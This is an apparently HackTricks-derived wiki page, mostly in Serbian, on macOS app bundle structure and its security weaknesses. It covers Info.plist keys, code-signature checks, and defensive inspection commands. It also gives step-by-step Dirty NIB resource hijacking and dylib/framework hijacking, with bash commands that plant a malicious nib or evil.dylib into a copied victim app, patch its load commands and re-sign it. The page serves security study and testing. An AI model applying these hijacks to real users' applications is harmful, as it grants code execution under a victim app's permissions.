# macOS paketi

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Bundle-i u macOS služe kao kontejneri za različite resurse uključujući aplikacije, biblioteke i druge neophodne fajlove, čineći da se pojavljuju kao jedinstveni objekti u Finder, kao što su poznati `*.app` fajlovi. Najčešće susrećeni bundle je `.app` bundle, iako su česti i drugi tipovi poput `.framework`, `.systemextension` i `.kext`.

### Suštinske komponente bundle-a

Unutar bundle-a, naročito unutar direktorijuma `<application>.app/Contents/`, nalazi se niz važnih resursa:

- **\_CodeSignature**: Ovaj direktorijum čuva detalje o potpisivanju koda koji su ključni za verifikaciju integriteta aplikacije. Možete pregledati informacije o potpisivanju koda koristeći komande kao što su:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Sadrži izvršni binarni fajl aplikacije koji se pokreće pri interakciji korisnika.
- **Resources**: Repozitorijum za korisnički interfejs aplikacije, uključujući slike, dokumente i opise interfejsa (nib/xib files).
- **Info.plist**: Funkcioniše kao glavna konfiguraciona datoteka aplikacije, ključna za to da sistem pravilno prepozna i poveže se sa aplikacijom.

#### Important Keys in Info.plist

Fajl `Info.plist` je kamen temeljac za konfiguraciju aplikacije i sadrži ključeve kao što su:

- **CFBundleExecutable**: Navodi ime glavnog izvršnog fajla koji se nalazi u `Contents/MacOS` direktorijumu.
- **CFBundleIdentifier**: Pruža globalni identifikator aplikacije, koji macOS široko koristi za upravljanje aplikacijama.
- **LSMinimumSystemVersion**: Označava minimalnu verziju macOS-a potrebnu za pokretanje aplikacije.

### Exploring Bundles

Da biste istražili sadržaj bundle-a, kao što je `Safari.app`, može se upotrebiti sledeća komanda: `bash ls -lR /Applications/Safari.app/Contents`

Ovo istraživanje otkriva direktorijume poput `_CodeSignature`, `MacOS`, `Resources`, i fajlove kao što je `Info.plist`, pri čemu svaki služi jedinstvenoj svrsi — od osiguranja aplikacije do definisanja njenog korisničkog interfejsa i operativnih parametara.

#### Additional Bundle Directories

Pored uobičajenih direktorijuma, bundle može takođe da uključuje:

- **Frameworks**: Sadrži ugrađene framework-e koje aplikacija koristi. Frameworks su kao dylibs sa dodatnim resursima.
- **PlugIns**: Direktorijum za plug-inove i ekstenzije koje proširuju mogućnosti aplikacije.
- **XPCServices**: Drži XPC servise koje aplikacija koristi za komunikaciju van procesa.

Ova struktura obezbeđuje da su svi neophodni komponenti enkapsulisani unutar bundle-a, olakšavajući modularno i bezbedno okruženje aplikacije.

For more detailed information on `Info.plist` keys and their meanings, the Apple developer documentation provides extensive resources: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Kada se karantinovani bundle prvi put izvrši, macOS obavlja dubinsku verifikaciju potpisa i može ga pokrenuti iz nasumično translokovanog puta. Kada je prihvaćen, naredna pokretanja obično rade samo plitke provere; fajlovi resursa u `Resources/`, `PlugIns/`, nibs itd. su istorijski bili neproveravani. Od macOS 13 Ventura se na prvom pokretanju primenjuje dubinska provera i nova *App Management* TCC dozvola ograničava treće procese da menjaju druge bundle-ove bez pristanka korisnika, ali stariji sistemi ostaju ranjivi.
- **Bundle Identifier collisions**: Više ugrađenih ciljeva (PlugIns, helper tools) koje ponovo koriste isti `CFBundleIdentifier` može pokvariti validaciju potpisa i povremeno omogućiti hijacking/confusion URL‑shema. Uvek enumerišite pod‑bundle‑ove i proverite jedinstvene ID‑eve.

## Resource Hijacking (Dirty NIB / NIB Injection)

Pre Venturre, zamenom UI resursa u potpisanoj aplikaciji moglo se zaobići plitko potpisivanje koda i dobiti izvršenje koda sa privilegijama aplikacije. Aktuelna istraživanja (2024) pokazuju da ovo i dalje radi na pre‑Ventura sistemima i na buildovima koji nisu u karantinu:

1. Kopirajte ciljnu aplikaciju na zapisivu lokaciju (npr. `/tmp/Victim.app`).
2. Zamenite `Contents/Resources/MainMenu.nib` (ili bilo koji nib deklarisan u `NSMainNibFile`) zlonamernim koji instancira `NSAppleScript`, `NSTask`, itd.
3. Pokrenite aplikaciju. Zlonamerni nib se izvršava pod bundle ID‑jem žrtve i sa njenim entitlements (TCC grants, microphone/camera, itd.).
4. Ventura+ ublažava rizik dubinskom verifikacijom bundle‑a pri prvom pokretanju i zahtevom za *App Management* dozvolom za kasnije izmene, tako da je postojanost teža, ali napadi pri inicijalnom pokretanju na starijim macOS verzijama i dalje važe.

Minimalan primer zlonamernog nib payload‑a (kompajlirajte xib u nib sa `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking unutar Bundles

Pošto `@rpath` pretrage preferiraju ugrađene Frameworks/PlugIns, ubacivanje zlonamerne biblioteke u `Contents/Frameworks/` ili `Contents/PlugIns/` može preusmeriti redosled učitavanja kada je glavni binarni fajl potpisan bez verifikacije biblioteka ili sa slabim `LC_RPATH` redosledom.

Tipični koraci pri zloupotrebi nepotpisanog/ad‑hoc bundle-a:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Napomene:
- Hardened runtime sa odsutnim `com.apple.security.cs.disable-library-validation` blokira third‑party dylibs; prvo proverite entitlements.
- XPC services under `Contents/XPCServices/` često učitavaju sibling frameworks—patch their binaries similarly for persistence or privilege escalation paths.

## Kratki vodič za brzu inspekciju
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Reference

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
